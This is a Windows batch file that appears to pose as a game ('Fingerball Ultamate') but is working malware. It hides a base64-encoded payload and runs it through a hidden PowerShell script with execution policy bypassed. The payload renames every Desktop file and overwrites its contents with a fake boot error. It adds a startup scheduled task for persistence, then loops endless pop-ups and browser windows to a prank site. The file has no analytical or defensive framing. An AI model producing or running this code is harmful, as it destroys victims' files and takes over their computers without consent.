
@echo off
echo powershell.exe -ExecutionPolicy Bypass -File "%~dp0Fingerball Ultamate v1.0 (snapshot 22a13).bat" > script.ps1
echo $Base64 = "Y21kIC9jIHBvd2Vyc2hlbGwgLU5vcCAtTm9uSSAtTm9sb2dvIC1XaW5kb3dTdHlsZSBIaWRkZW4gIldyaXRlLUhvc3QiDQpAZWNobyBvZmYgDQpmb3IgJSVBIGluICgiJVVTRVJQUk9GSUxFJVxEZXNrdG9wXCoiKSBkbyAoDQogICAgcmVuICIlJUEiICIlJX5uQS50eHQiDQogICAgZWNobyBFcnJvciBsb2FkaW5nICJib290bWdyIiEgPiAiJVVTRVJQUk9GSUxFJVxEZXNrdG9wXCUlfm5BLnR4dCINCikNCnNjaHRhc2tzIC9jcmVhdGUgL3RuICJNeVRhc2siIC90ciAiJTAiIC9zYyBPTlNUQVJUDQo6bG9vcCANCmVjaG8gbXNnYm94ICJUaGlzIHByb2dyYW0gaXMgYSBwb3RlbnRpYWwgdGhyZWF0IHRvIHlvdXIgY29tcHV0ZXIhIERveW91IHdpc2ggdG8gY29udGludWU/IiA+ICV0ZW1wJVx0bXAudmJzDQpzdGFydCAldGVtcCVcdG1wLnZicw0KZXhwbG9yZXIgImh0dHBzOi8vd3d3LnlvdWFyZWFuaWRpb3QuY2MiDQpnb3RvIGxvb3ANCg==" >> script.ps1
echo $DecodedBytes = [System.Convert]::FromBase64String($Base64) >> script.ps1
echo $DecodedString = [System.Text.Encoding]::UTF8.GetString($DecodedBytes) >> script.ps1


echo $TempFile = [System.IO.Path]::GetTempFileName() + ".bat" >> script.ps1
echo [System.IO.File]::WriteAllText($TempFile, $DecodedString) >> script.ps1


echo cmd /c $TempFile >> script.ps1


echo Remove-Item $TempFile >> script.ps1
attrib +s +h script.ps1

powershell -ExecutionPolicy Bypass -File "script.ps1"
